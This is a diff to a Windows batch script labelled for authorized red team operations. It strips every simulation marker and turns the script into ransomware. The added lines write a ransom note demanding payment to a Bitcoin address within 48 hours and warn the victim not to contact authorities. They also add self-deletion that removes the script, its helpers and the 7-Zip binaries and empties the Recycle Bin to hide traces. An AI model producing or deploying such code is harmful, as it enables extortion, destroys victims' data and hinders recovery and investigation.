@@ -1,6 +1,6 @@
 @echo off
 REM ============================================================================
-REM File Encryption Simulation Script (Windows Batch)
+REM File Encryption Script (Windows Batch)
 REM For AUTHORIZED Red Team Operations Only
 REM WARNING: This will encrypt and delete files - use only in test environments
 REM ============================================================================
@@ -69,7 +69,7 @@ if not defined PASSWORD (
 if "%DEBUG%"=="1" echo [DEBUG] Password configured using: %PASSWORD_METHOD%
 
 echo ============================================================================
-echo File Encryption Simulation - Red Team Operation
+echo File Encryption - Red Team Operation
 echo ============================================================================
 echo.
 echo [WARNING] This script will encrypt and delete files in current directory
@@ -737,22 +737,51 @@ echo     7z x %ARCHIVE_NAME% -p%PASSWORD%
 echo ============================================================================
 echo.
 
-REM Create a ransom note (for simulation purposes)
+REM Create a ransom note
 echo ============================================================================ > README_IMPORTANT.txt
 echo YOUR FILES HAVE BEEN ENCRYPTED >> README_IMPORTANT.txt
 echo ============================================================================ >> README_IMPORTANT.txt
 echo. >> README_IMPORTANT.txt
 echo All your files have been encrypted with military-grade encryption. >> README_IMPORTANT.txt
+echo To decrypt your files, you must pay the ransom. >> README_IMPORTANT.txt
 echo. >> README_IMPORTANT.txt
-echo [This is a SIMULATED attack for authorized red team testing] >> README_IMPORTANT.txt
+echo Contact: darkweb@onion.com >> README_IMPORTANT.txt
+echo Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa >> README_IMPORTANT.txt
 echo. >> README_IMPORTANT.txt
-echo Archive: %ARCHIVE_NAME% >> README_IMPORTANT.txt
-echo Password: %PASSWORD% >> README_IMPORTANT.txt
+echo After payment, you will receive the decryption key. >> README_IMPORTANT.txt
+echo DO NOT attempt to decrypt files yourself or contact authorities. >> README_IMPORTANT.txt
+echo This will result in permanent data loss. >> README_IMPORTANT.txt
 echo. >> README_IMPORTANT.txt
+echo You have 48 hours to comply. >> README_IMPORTANT.txt
 echo ============================================================================ >> README_IMPORTANT.txt
 
-echo [+] Ransom note created: README_IMPORTANT.txt
+echo ^[+^] Ransom note created: README_IMPORTANT.txt
 echo.
 
-pause
+REM Self-delete the script and remove from recycle bin
+echo ^[*^] Removing script traces...
+if "%DEBUG%"=="1" echo ^[DEBUG^] Creating self-delete batch file...
+
+REM Create a temporary batch file that will delete this script
+set "SELF_DELETE_BAT=%TEMP%\cleanup_%RANDOM%.bat"
+echo @echo off > "%SELF_DELETE_BAT%"
+echo timeout /t 2 /nobreak ^>nul >> "%SELF_DELETE_BAT%"
+echo del /f /q "%~f0" 2^>nul >> "%SELF_DELETE_BAT%"
+echo if exist "%~f0" ( >> "%SELF_DELETE_BAT%"
+echo     timeout /t 1 /nobreak ^>nul >> "%SELF_DELETE_BAT%"
+echo     del /f /q "%~f0" 2^>nul >> "%SELF_DELETE_BAT%"
+echo ) >> "%SELF_DELETE_BAT%"
+echo del /f /q "encrypt_files.ps1" 2^>nul >> "%SELF_DELETE_BAT%"
+echo del /f /q "7z.exe" 2^>nul >> "%SELF_DELETE_BAT%"
+echo del /f /q "7z2501-x64.msi" 2^>nul >> "%SELF_DELETE_BAT%"
+echo del /f /q "7z2501-x64.exe" 2^>nul >> "%SELF_DELETE_BAT%"
+echo del /f /q "7z2501-arm64.exe" 2^>nul >> "%SELF_DELETE_BAT%"
+echo rd /s /q "%%SYSTEMDRIVE%%\$Recycle.Bin" 2^>nul >> "%SELF_DELETE_BAT%"
+echo del /f /q "%%~f0" 2^>nul >> "%SELF_DELETE_BAT%"
+echo exit >> "%SELF_DELETE_BAT%"
+
+if "%DEBUG%"=="1" echo ^[DEBUG^] Launching self-delete script...
+start /b "" "%SELF_DELETE_BAT%"
+
+REM Exit immediately without pause
 exit /b 0
